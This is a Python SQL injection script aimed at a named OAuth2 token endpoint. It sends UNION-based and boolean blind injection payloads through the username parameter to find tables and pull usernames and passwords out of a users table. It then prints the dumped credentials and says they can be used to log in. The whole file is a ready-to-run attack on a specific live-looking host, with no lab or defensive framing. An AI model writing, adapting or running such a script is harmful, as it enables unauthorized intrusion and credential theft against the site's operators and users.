import requests
import re
import time

API_URL = "https://ntrdb.undress.run/api/auth/oauth2/token"


def send(payload):
    params = {"username": payload, "password": "5xhyq0Ue8/JxPg==", "grant_type": "aig", "scope": "server"}
    resp = requests.get(API_URL, params=params, timeout=10)
    return resp.text


def is_sql_error(resp):
    # 常见 SQL 报错关键词
    return bool(re.search(r'(?:SQL\s+syntax|Unknown\s+column|Table.+doesn\'t\s+exist|1064|1054)', resp, re.I))


def extract_union_result(resp):
    # 尝试从 JSON 或纯文本中提取 UNION 回显
    match = re.search(r'"(?:data|token|message)":\s*["\']([^"\']+?)["\']', resp) or re.search(
        r'"(?:[a-zA-Z_]+)":\s*"([^"]+)"', resp)
    return match.group(1) if match else resp[:300]


def main():
    print("[*] 🚀 Starting SQL Injection on OAuth2 Token Endpoint")

    # 1. 探测列数 & UNION回显
    print("[*] 🔍 Step 1: Testing UNION visibility...")
    for cols in range(1, 6):
        payload = f"1'+UNION+SELECT+CONCAT(username,0x3a,password)+{','.join(['1'] * max(0, cols - 1))}+FROM+users--+"
        resp = send(payload)

        if is_sql_error(resp):
            print(f"✅ SQL Error detected! Likely {cols} columns.")
            break
        if extract_union_result(resp):
            print(f"✅ UNION visible at {cols} columns!")
            print("📦 Result:", extract_union_result(resp))
            break
    else:
        print("⚠️ UNION not clearly visible. Falling back to blind injection...")

        # 2. 布尔盲注探测表名
        print("[*] 🔍 Step 2: Blind injection to find table...")
        tables = ["admin", "users", "account", "ntrdb_admin", "members"]
        found = False
        for tbl in tables:
            p = f"1'+AND+(SELECT+1+FROM+{tbl}+LIMIT+1)+IS+NOT+NULL--+"
            resp = send(p)
            if len(resp) > 50 and "token" in resp:  # 盲注成功通常返回正常token
                print(f"✅ Table '{tbl}' exists!")
                found = True
                break

        if not found:
            print("🔄 Trying information_schema...")
            p = f"1'+UNION+SELECT+1,2,3,4,5+FROM+information_schema.tables+WHERE+table_schema=database()--+"
            resp = send(p)
            result = extract_union_result(resp)
            if result:
                print(f"📋 Tables: {result}")
            else:
                print("⚠️ Blind injection didn't return clear results. Check response length change.")
            return

        # 3. 提取凭证
        print("[*] 📥 Step 3: Extracting credentials...")
        p = f"1'+UNION+SELECT+1,2,group_concat(username,0x3a,password)+FROM+users--+"
        resp = send(p)
        result = extract_union_result(resp)
        print(f"🔑 Admin Credential:\n{result}")

    print("\n✅ Injection complete. You can now use the extracted credentials to login.")


if __name__ == "__main__":
    main()
